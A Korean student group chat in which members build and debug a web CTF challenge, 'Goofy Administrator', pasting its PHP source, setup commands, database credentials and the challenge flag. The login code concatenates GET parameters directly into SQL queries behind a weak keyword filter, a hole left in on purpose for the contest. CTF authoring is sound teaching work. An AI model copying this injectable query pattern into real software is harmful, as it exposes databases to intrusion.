+[김나진] [오전 2:23] 2학년이 도커를 한다는 것 자체가 무리수였다
+[이재아] [오전 2:23] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ근데 도커 진짜 말도 안되긴했어요…
+[송민영] [오전 2:23] git도 겨우겨우하는데...
+[김나진] [오전 2:23] 하는 인간들도 있지만 나는 아니다
+[송민영] [오전 2:23] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오전 2:23] 차라리 무슨말이라도 있으면
+[송민영] [오전 2:23] 뭐라도 하겠는데
+[송민영] [오전 2:23] 아무말도 없고
+[김나진] [오전 2:23] 언니들 단체로  잠수탄 것 같아
+[송민영] [오전 2:24] 제출기간은 지난건지 아니면 오늘까지인건지도 모르겟고
+[송민영] [오전 2:24] 내일이 대회인데
+[김나진] [오전 2:24] ㅋㅋㅋㅋㅋㄲㅋㅋㅋㅋㅋㄱㅋㄲ
+[송민영] [오전 2:24] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[이재아] [오전 2:24] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오전 2:24] 혹시 임원진 제의 받으셨어요/
+[이재아] [오전 2:24] 저는 안받았어요!
+[송민영] [오전 2:24] 그렇군요!
+[송민영] [오전 2:25] 해킹 해보니깐 어떠세요
+[이재아] [오전 2:25] 저는 아닌것 같아요 ㅎㅎ
+[이재아] [오전 2:25] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오전 2:25] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㄴ
+[송민영] [오전 2:25] 저도 그래요...
+[김나진] [오전 2:25] 시스 들어오고 진로가 명확해졌어요
+[송민영] [오전 2:25] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 2:25] 보안을 제외함으로써 길이 좁아졌죠
+[송민영] [오전 2:25] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 2:26] 재아 언니는 도커개념부터 차근히 공부하신 거에요?
+[이재아] [오전 2:27] 차근히는 아니고,, 그냥 처음 시작할때부터 건들이긴 했는데…
+[이재아] [오전 2:27] 안되더라구요…ㅎ
+[송민영] [오전 2:27] 근데 역할 배정받은거
+[송민영] [오전 2:27] 사다리타기로 된거에요?
+[이재아] [오전 2:27] 아 처음에 회의할때 제가 맥북이랑 윈도우 둘다 있어서 제가 도커 공부하게 된거에용
+[송민영] [오전 2:27] 아하
+[김나진] [오전 2:27] 세상에...
+[송민영] [오전 2:28] 가장 힘든걸...
+[이재아] [오전 2:28] 처음엔 쉬울줄 알ㅇ고…
+[김나진] [오전 2:28] 언젠간 도움이 될 거에요
+[이재아] [오전 2:28] ㅋㅋㅋㅋㅋㅋㅋㅋ넴 ㅠ
+[이재아] [오전 2:28] 그래서 결론은 우리 도커 안해도 되는거죠…?
+[이재아] [오전 2:28] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 2:28] ㅋㅋㅋㅋㅋㄱㅋㅋㄱㅋㄱㅋ
+[송민영] [오전 2:28] 그냥 전 포기했습니다
+[송민영] [오전 2:28] 우분투 껏어요
+[김나진] [오전 2:28] 재아 언니도 같이 행복회로 돌릴래요
+[김나진] [오전 2:29] 난 컴터 껐어요
+[송민영] [오전 2:29] 저희 지금 그분들이 도커파일 만들어주고 있따고 믿고있어요
+[송민영] [오전 2:29] 답이 없어보여서
+[이재아] [오전 2:29] 네 저도,, 컴퓨터 꺼야겠따…
+[송민영] [오전 2:30] 무서운건
+[송민영] [오전 2:30] 3시에 답장이 오는거
+[송민영] [오전 2:30] 제발 오지 않았음ㄴ
+[송민영] [오전 2:30] 으면
+[김나진] [오전 2:30] 아...안돼..
+[송민영] [오전 2:31] 나 그럼 진짜
+[송민영] [오전 2:31] 잠수탈지도 몰라
+[김나진] [오전 2:31] ㅋㅋㄱㅋㄱㅋㄱㅋㄱㅋㄱㅋㄱㄱㅋ
+[송민영] [오전 2:31] 싸강이니깐 만날일도 없지
+[송민영] [오전 2:31] 바로 잠수
+[김나진] [오전 2:31] 워워 진정해
+[김나진] [오전 2:31] 저 채팅방 이름을
+[김나진] [오전 2:32] 도커의 노예들
+[김나진] [오전 2:32] 이라고 지어도 될 것 같아
+[송민영] [오전 2:32] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오전 2:32] 도커 난 아직까지도 잘 모르겟어
+[김나진] [오전 2:32] 나도 모르겠어
+[송민영] [오전 2:32] 진짜 이분야에서
+[송민영] [오전 2:32] 제대로 책쓰면
+[송민영] [오전 2:32] 뉴욕에 땅 살수 있을만큼 돈 벌수 있을듯
+[김나진] [오전 2:32] 누가 초보용으로 교재 내야 해
+[송민영] [오전 2:33] 다들 제각각이야
+[김나진] [오전 2:33] 난 이제 고래랑 펭귄 싫어할거야
+[김나진] [오전 2:33] 죄다 동물을 갖다붙여놨어
+[이재아] [오전 2:33] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오전 2:34] ㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오전 2:34] 자바는 자바칩 프로프니노 좋아해서
+[송민영] [오전 2:34] 자바 된거라매
+[송민영] [오전 2:34] 작명센스....
+[김나진] [오전 2:34] 왜 이유가 그따구야
+[송민영] [오전 2:34] 초콜릿 좋아하는 사람 나오면
+[김나진] [오전 2:34] 뭐 컴공 사람들이 그렇지
+[송민영] [오전 2:34] 이름 초코릿 될듯
+[송민영] [오전 2:34] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 2:35] 센스가 없단 말이야..
+[김나진] [오전 2:35] 자바칩은 꽤 큰 충격인걸
+[송민영] [오전 2:35] ㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 2:36] 난 이제 잘거아
+[김나진] [오전 2:36] 자고 일찍 일어나서
+[김나진] [오전 2:36] 밀린 강의를 듣다가
+[송민영] [오전 2:36] 나도나도
+[김나진] [오전 2:36] 톡이오면 부리나케 우분투를 켜겠어
+[송민영] [오전 2:36] 안돼....
+[송민영] [오전 2:36] 안오지 않을까
+[이재아] [오전 2:36] 내일이 대회 맞죠..?
+[송민영] [오전 2:37] 네네!
+[김나진] [오전 2:37] 여러분 잘자요
+[송민영] [오전 2:37] 빠이빠이
+[이재아] [오전 2:37] ㅋㅋㅋㅋ굳밤되세용
+[송민영] [오전 2:37] 재아님도 자러가실건가요??
+[이재아] [오전 2:38] 네네!!ㅎㅎ 말 편하게 해요 우리 ㅋㅋㅋㅋㅋ
+[송민영] [오전 2:38] 그래그래
+[송민영] [오전 2:38] ㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[이재아] [오전 2:39] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ응ㅇ응
+[송민영] [오전 2:40] 그럼 자러갈거지?
+[이재아] [오전 2:41] ㅋㅋㅋㅋㅇ응 너눈 안자?
+[송민영] [오전 2:41] 나 좀 놀다가
+[송민영] [오전 2:41] 잘려고
+[송민영] [오전 2:41] 게임도 좀 하고...
+[이재아] [오전 2:41] 아핰ㅋㅋㅋㅋㅋ 도커 포기한 기념으로다가…ㅋㅋㅋㅋㅋㅋㅋ
+[이재아] [오전 2:41] 즐기다 잘자!ㅋㅋㅋㅋ
+[송민영] [오전 2:42] ㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[송민영] [오전 2:42] 그래 잘자!
+[김나진] [오전 8:26] 지우 언니한테서 톡왔어
+[김나진] [오전 8:26] chmod로 권한 바꾸면 된대
+[송민영] [오전 9:35] 우리꺼 계속 안되는등
+[송민영] [오전 11:09] 나진아
+[김나진] [오전 11:45] 오 이런 지금 일어났다
+[김나진] [오전 11:46] setup.sh 문제야?
+[송민영] [오전 11:48] 노노
+[송민영] [오전 11:48] 우리 연결 안돼
+[송민영] [오전 11:48] mysql하고 php가
+[송민영] [오전 11:49] 너 index_process 변경했어?
+[김나진] [오전 11:51] 아니
+[송민영] [오전 11:51] 근데
+[송민영] [오전 11:51] index.php
+[송민영] [오전 11:51] 에서
+[송민영] [오전 11:51] index_process2.php라고 되있던데
+[김나진] [오전 11:52] 왓
+[김나진] [오전 11:52] 이런
+[김나진] [오전 11:52] 2지워야 돼
+[송민영] [오전 11:52] 지웠는데도 안됨
+[송민영] [오전 11:52] index_process.php가
+[송민영] [오전 11:54] 너
+[송민영] [오전 11:54] index_process.php
+[송민영] [오전 11:54] 다시 보내줄수 잇어
+[김나진] [오전 11:54] 잠만
+[송민영] [오전 11:54] 윈도우에서 되나 확인해보고
+[김나진] [오후 12:01] 윈도우 로컬에서는 잘 돼
+[김나진] [오후 12:01] 코드를 다 새로 보내줄게
+[김나진] [오후 12:01] 삭제된 메시지입니다.
+[김나진] [오후 12:01] <?php
+  setcookie('HEYGOOFY','0h1f0r90tmypa55w0rd',time()+3600);
+ ?>
+<html>
+<head>
+<title>Goofy Administrator</title>
+<style type="text/css">
+body { background:white; color:black; font-size:10pt; }
+input { background:silver; color:black; font-size:9pt; }
+</style>
+</head>
+<body><br><br>
+<center>
+<form method=get action=index_process.php>
+<table border=0 align=center cellpadding=10 cellspacing=0>
+<tr><td colspan=2 align=center><h1>Goofy Administrator</h1></td></tr>
+<tr><td align=center>id : <input name='id' size=30></td><td></td></tr>
+<tr><td align=center>pw : <input name='pw' size=30></td><td><input type=submit></td></tr>
+</form>
+</center>
+</body>
+</html>
+[김나진] [오후 12:02] index.php
+[김나진] [오후 12:02] <?php
+  include "./config.php";
+
+    $connect = mysqli_connect($host, $username, $password, $name);
+
+    if(mysqli_connect_errno()) {
+        echo "Failed to connect to MySQL: " . mysqli_connect_error();
+    }
+    echo "<br>";
+
+    if (!$connect) {
+        echo "Error: " . mysqli_connect_error();
+        exit();
+    }
+
+  ?>
+
+
+  <html>
+  <head>
+  <title>Goofy Administrator</title>
+  <style type="text/css">
+  body { background:white; color:black; font-size:10pt; }
+  input { background:silver; color:black; font-size:9pt; }
+  </style>
+  </head>
+  <body><br><br>
+  <center>
+  <form method=get action=index_process2.php>
+  <table border=0 align=center cellpadding=10 cellspacing=0>
+  <tr><td colspan=2 align=center><h1>Goofy Administrator</h1></td></tr>
+  <tr><td align=center>id : <input name='id' size=30></td><td></td></tr>
+  <tr><td align=center>pw : <input name='pw' size=30></td><td><input type=submit></td></tr>
+  </form>
+  <?php
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+  $query = "select id from user where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
+  $result = mysqli_fetch_array(mysqli_query($connect, $query));
+  if($result===null){
+    echo "Oh.... nonono...<br>Now stand back and let me tell you my tale of woe.
+    <h2>Don't be a webm45ter</h2>";
+  }
+  else {echo "<h2>Hello webmaster!</h2>";
+
+  $_GET['pw']=addslashes($_GET['pw']);
+  $query="select id, pw from user where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
+  $result=mysqli_fetch_array(mysqli_query($connect, $query));
+  if($result)
+    if($result['id'] == $_GET['id'] && ($result['pw']) && ($result['pw'] == $_GET['pw']))
+      echo "POX{v4cc1ne_p4ssw0rd_9et_daedanhae}";
+  }
+
+  ?>
+  </center>
+  </body>
+  </html>
+[김나진] [오후 12:02] index_process.php
+[송민영] [오후 12:02] mysql db 명하고
+[송민영] [오후 12:03] table 어떻게 create 했는지도 알려줘
+[김나진] [오후 12:04] 아 윈도우에서
+[김나진] [오후 12:04] ?
+[송민영] [오후 12:04] 응응
+[김나진] [오후 12:04] <?php
+//php versioin: 7.4.7
+/*
+DB_HOST
+DB_USERNAME
+DB_PASSWORD
+DB_NAME
+*/
+$host = 'localhost';
+$username = 'root';
+$password = '3190024jina';
+$name = 'problem';
+
+?>
+[김나진] [오후 12:05] 이게 윈도우에서 실행하는 config.php야 도커에 들어 있는 거랑 호스트랑 유저명이랑 비번이랑 디비 이름이 달라
+[김나진] [오후 12:05] 금방보내줄게
+[김나진] [오후 12:06] 윈도우에서 mysql db명은 prlblem 이야
+[송민영] [오후 12:06] $password = '3190024jina';
+[송민영] [오후 12:06] 이거 패스워드는
+[김나진] [오후 12:07] 윈도우 로컬 기준
+[송민영] [오후 12:07] 너가 mysql에 접속할때 쓰는
+[송민영] [오후 12:07] 그
+[송민영] [오후 12:07] 패스워드 맞지?
+[김나진] [오후 12:07] 응
+[송민영] [오후 12:07] ㅇㅋㅇㅋ
+[김나진] [오후 12:10] 사진
+[김나진] [오후 12:10] 맨 위에 있는게 mysql table 만들때 쓴 명령어
+[김나진] [오후 12:16] insert 문도 보낼카?
+[송민영] [오후 12:17] 응응
+[송민영] [오후 12:19] 지금 mysql 연결 확인되는지 볼려고
+[송민영] [오후 12:19] mysql 연결 코드 넣어서 하고 있는데
+[송민영] [오후 12:19] 안됨...
+[김나진] [오후 12:20] 도커에서?
+[김나진] [오후 12:20] insert into user(id, pw) values ('webmaster', 'sm6yn23ib9');
+[송민영] [오후 12:21] 도커말고
+[송민영] [오후 12:21] 아애리눅스에서
+[송민영] [오후 12:21] 안됨
+[송민영] [오후 12:21] 우분투에서 안되서
+[송민영] [오후 12:21] 도커에서도 안되는듯
+[김나진] [오후 12:21] inset into user(id) values ('guest');
+[김나진] [오후 12:21] 음...
+[김나진] [오후 12:21] 아 리눅스에서 mysql로 db만들고 있었구나
+[송민영] [오후 12:23] 리눅스 환경에서 해야되니깐
+[송민영] [오후 12:23] 너도 한번
+[남지윤] [오후 12:23] 나 너트북 받았어..!!!
+[김나진] [오후 12:23] !!!!!!!!!!
+[송민영] [오후 12:23] 아파치, mysql, php 다운받아서 해봐봐
+[김나진] [오후 12:23] 오키오키
+[송민영] [오후 12:23] https://webnautes.tistory.com/1185
+[송민영] [오후 12:23] 이거 그냥 따라했떠니
+[송민영] [오후 12:24] index.php는 떳거든
+[송민영] [오후 1:10] 다들 잘 되니
+[김나진] [오후 1:11] 지금 설치는 다해서 파일 옮겨서 실행해 보면 돼 잠만 기둘
+[송민영] [오후 1:20] https://blog.lael.be/post/7264
+[송민영] [오후 1:20] 저거 안되면
+[송민영] [오후 1:20] 이거보고 하면될듯
+[송민영] [오후 1:20] 난 일단
+[송민영] [오후 1:20] 왜인지 모르겠는데
+[송민영] [오후 1:20] sql이 연결이 안돼
+[김나진] [오후 1:21] 나도 안돼
+[김나진] [오후 1:21] ㄱㄱㅋㅋㅋㅋㄱㅋㅋ
+[송민영] [오후 1:21] 오노
+[송민영] [오후 1:22] 너 혹시 phpmyadmin
+[송민영] [오후 1:22] 설치했니
+[김나진] [오후 1:27] 설치한 기억이 없는데..  따로 설치해야하나
+[송민영] [오후 1:27] 안설치해도 되는거 같은데
+[송민영] [오후 1:27] 아니면 잠만
+[송민영] [오후 1:29] echo "<?php phpinfo(); ?>" > /var/www/html/myphpinfo.php
+[송민영] [오후 1:29] 이 명령어 실행ㅆ을때 되는지 볼래
+[송민영] [오후 1:29] 난 이거는 실행되거든
+[김나진] [오후 1:35] 나 지금 ubuntu 18.04로 다시 깔려고
+[김나진] [오후 1:35] 이거따라했더기
+[김나진] [오후 1:35] 니
+[김나진] [오후 1:35] 이게 된다는 거지?
+[송민영] [오후 1:37] 난 이걸로했고
+[송민영] [오후 1:37] 16.04로 했는데도 됐는데
+[송민영] [오후 1:37] 넌 저거 안돼?
+[김나진] [오후 1:49] 이걸로는 안해봤어
+[김나진] [오후 1:49] 얼른 깔아서 해본게
+[김나진] [오후 1:49] 볼
+[송민영] [오후 2:35] 다들 어때
+[이재아] [오후 2:38] 다시 해보는 중인거야?
+[송민영] [오후 2:39] docker말고
+[송민영] [오후 2:39] 아얘 우분투 환경에서
+[송민영] [오후 2:39] 웹페이지가 실행되어야지
+[송민영] [오후 2:39] docker에서도 할 수 있다고 해서
+[송민영] [오후 2:40] ㅇ분투에서 지금 하고있어
+[김나진] [오후 3:37] 난 저 파일 설정하다가 오류남
+[송민영] [오후 3:40] 이게 오류난다고?
+[김나진] [오후 3:42] 아니아니 블로그 따라하다가 오류났어 vi로 파일 여러개 수정하잖아 수정했더니 아예 localhost로 접속이 안돼
+[송민영] [오후 3:42] 난 vi로 파일 수정별로 안해서
+[송민영] [오후 3:42] 그건 또 왜그러지
+[김나진] [오후 3:46] 난 윗 블로그대로 해볼게 18.04는 또 처음이라서
+[송민영] [오후 3:54] 근데 지금 빨리 해야 할듯
+[송민영] [오후 3:54] 지윤이도 하고 있나
+[송민영] [오후 3:54] 난 계속 mysql 연동이 안되는거 같은데
+[송민영] [오후 3:55] 에러도 안뜨뜨거든
+[송민영] [오후 3:55] 사진
+[송민영] [오후 3:55] 계속 이런식으로만 뜸
+[김나진] [오후 4:06] 오 이런
+[김나진] [오후 4:13] 사진
+[김나진] [오후 4:14] 나 돼
+[김나진] [오후 4:14] 와하
+[김나진] [오후 4:15] 사진
+[김나진] [오후 4:16] 여기서 apt install php php-mysql 까지 하니까 된다
+[김나진] [오후 4:18] 나 이제 뭐해야 해
+[김나진] [오후 4:19] 도커 깔아볼까
+[김나진] [오후 4:21] 사진
+[김나진] [오후 4:21] 쿠키도 잘 만들어졌어
+[김나진] [오후 4:22] 문제가 하나 있어
+[김나진] [오후 4:23] id guest로 
+하고 guest 비번 입력해도 문제가 풀려
+[송민영] [오후 4:23] 진짜?
+[송민영] [오후 4:23] 헐
+[김나진] [오후 4:23] ㅋㅋㅋㅋㄱㅋㄱㅋㅋ
+[김나진] [오후 4:23] 코드 추가하지 뭐
+[송민영] [오후 4:24] 너 혹시 디코 가능하니
+[송민영] [오후 4:24] 그냥 디코로 너 화면 보면서 하는게 좋을거 같은데
+[김나진] [오후 4:24] 우분투에 깔아볼게
+[송민영] [오후 4:24] 지금 가상머신에서 우분투 돌린거 아녀?
+[김나진] [오후 4:25] 아니야 pc 자체가 우분투야
+[송민영] [오후 4:25] 아
+[송민영] [오후 4:25] 오키
+[김나진] [오후 4:30] 디스코드 설치됐어
+[송민영] [오후 6:07] 사진
+[김나진] [오후 6:08] .,... .비극이다
+[김나진] [오후 6:10] 난 돌려보려면 도커 설치해야 하는데..
+[송민영] [오후 6:14] 따로 설정한거 없냐고 물어보는데
+[송민영] [오후 6:14] 없지?
+[김나진] [오후 6:15] 없어
+[송민영] [오후 6:15] 파일: goofy_admin (4).zip
+[송민영] [오후 6:15] 한번 파일보고
+[송민영] [오후 6:15] sql파일에서
+[송민영] [오후 6:15] 이상한부분ㄱ같은거
+[송민영] [오후 6:15] 찾아볼래
+[송민영] [오후 6:16] 내가 잘못썼을수도 있으니깐
+[김나진] [오후 6:16] 저녁먹고 한번 해볼게
+[김나진] [오후 7:12] db.sql에서 두번째줄 use user를 use problem으로 바꿔야해
+[송민영] [오후 7:21] 이것만 해결하면 돌아간대? 나는 이거 고쳤는데 안돼서
+[송민영] [오후 7:21] 라는데
+[송민영] [오후 7:22] 그거 그대로 지우한테 한번 보낼수 있어?
+[김나진] [오후 7:22] 그래
+[김나진] [오후 7:23] 나도 설치해서 돌려봐야겠다
+[송민영] [오후 7:23] 익스코드도 보내달래
+[김나진] [오후 7:23] 오키
+[송민영] [오후 7:30] 사진
+[김나진] [오후 7:31] 도커로... 돌려야 하는군..,
+[김나진] [오후 7:31] 한다...설치.,도커..
+[김나진] [오후 8:27] 사진
+[김나진] [오후 8:27] 연결을 할 수 없다는데 어떻게 해결해야 할까
+[김나진] [오후 8:41] 민영이 언니 집이야?
+[송민영] [오후 9:21] 나 지금 집이어서
+[송민영] [오후 9:21] 밥먹고 볼게
+[송민영] [오후 9:57] 아직 안되는거지?
+[송민영] [오후 10:13] 나진나진
+[김나진] [오후 10:14] 응
+[김나진] [오후 10:14] 아직 안돼
+[송민영] [오후 10:14] 넌 어디가 안돼?
+[송민영] [오후 10:16] 지금 디코 가능해?
+[김나진] [오후 10:17] index process  안돼
+[김나진] [오후 10:17] 그냥 흰 화면이여
+[김나진] [오후 10:17] 디코 가능
+[송민영] [오후 10:18] 나도 거기가 안돼
